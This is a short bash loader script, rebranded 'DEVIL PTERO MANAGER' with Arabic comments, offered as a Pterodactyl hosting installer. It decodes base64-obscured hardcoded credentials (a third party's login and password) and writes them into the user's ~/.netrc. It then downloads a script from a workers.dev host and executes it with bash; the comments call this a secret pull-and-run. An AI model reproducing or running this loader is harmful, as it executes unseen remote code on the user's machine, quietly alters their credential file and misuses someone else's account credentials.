#!/usr/bin/env bash
# [ DEVIL HOSTING MANAGER - LOADER ]
# Modified by: DEVIL
set -euo pipefail

# هنا السيرفر اللي رح يسحب منه الكود (تقدر تغيره لسيرفرك مستقبلاً)
URL="https://pterov2.jishnudiscord7.workers.dev"
HOST="pterov2.jishnudiscord7.workers.dev"
NETRC="${HOME}/.netrc"

# دالة فك التشفير الخاصة بديفل
d_decode() { printf '%s' "$1" | base64 -d; }

# الهوية الجديدة (تقدر تخليها زي ما هي عشان يشتغل السحب من سيرفره حالياً)
D_USER_B64="amlzaG51"
D_PASS_B64="amlzaG51aEBja2VyMTIz"

D_USER="$(d_decode "$D_USER_B64")"
D_PASS="$(d_decode "$D_PASS_B64")"

if [ -z "$D_USER" ] || [ -z "$D_PASS" ]; then
  echo "Error: Devil Credentials failed." >&2
  exit 1
fi

# التأكد من وجود المتطلبات
if ! command -v curl >/dev/null 2>&1; then
  echo "Error: curl is required for Devil Loader." >&2
  exit 1
fi

# تجهيز ملف الاتصال السري
touch "$NETRC"
chmod 600 "$NETRC"

tmpfile="$(mktemp)"
grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
mv "$tmpfile" "$NETRC"

{
  printf 'machine %s ' "$HOST"
  printf 'login %s ' "$D_USER"
  printf 'password %s\n' "$D_PASS"
} >> "$NETRC"

clear
echo "------------------------------------------"
echo "        🚀 DEVIL PTERO MANAGER           "
echo "          Powered by Devil               "
echo "------------------------------------------"

# عملية السحب والتشغيل السري
script_file="$(mktemp)"
cleanup() { rm -f "$script_file"; }
trap cleanup EXIT

if curl -fsS --netrc -o "$script_file" "$URL"; then
  # هنا السحر: بيشغل السكريبت اللي سحبه
  bash "$script_file"
else
  echo "Devil Link: Authentication failed." >&2
  exit 1
fi